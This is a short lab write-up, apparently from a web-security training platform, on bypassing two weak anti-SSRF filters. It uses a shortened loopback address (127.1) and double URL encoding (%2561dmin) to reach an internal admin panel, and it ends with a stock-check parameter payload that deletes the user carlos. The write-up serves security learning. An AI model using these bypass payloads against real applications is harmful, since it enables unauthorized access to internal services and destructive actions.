### Third Exercise 🐱‍👓


![problem.PNG](/assets/SSRF/Third/problem.PNG)

#### **To do**
```
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.  
```


1. Try to access with
+ `http://localhost/admin`
+ `http://127.0.0.1/admin`

**Output**

![response.PNG](/assets/SSRF/Third/response.PNG)


2. You can remove zeros to `127.0.0.1` -> `127.1`
Now, try with `http://127.1/admi`


**Output**

![code404.PNG](/assets/SSRF/Third/code404.PNG)

* Access to **admi** for check if the IP address is valid.
* **Code 404** we tell the IP address is valid but the resource to try access is incorrect.

3. Access with `http://127.1/%2561dmin`

**Output**

![admin-panel.PNG](/assets/SSRF/Third/admin-panel.PNG)

* Encode the **letter a** to try to camouflage our malicious petition (a -> %61) and then enconde **character %** -> (%2561).
* Do this because the web page unencode the URL only one time 
`http://127.1/%2561dmin` =====> `http://127.1/%61dmin`

4. Inspect the code of web page

![code-webpage.PNG](/assets/SSRF/Third/code-webpage.PNG)


5. Delete **user carlos**

```bash
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

You solve the lab!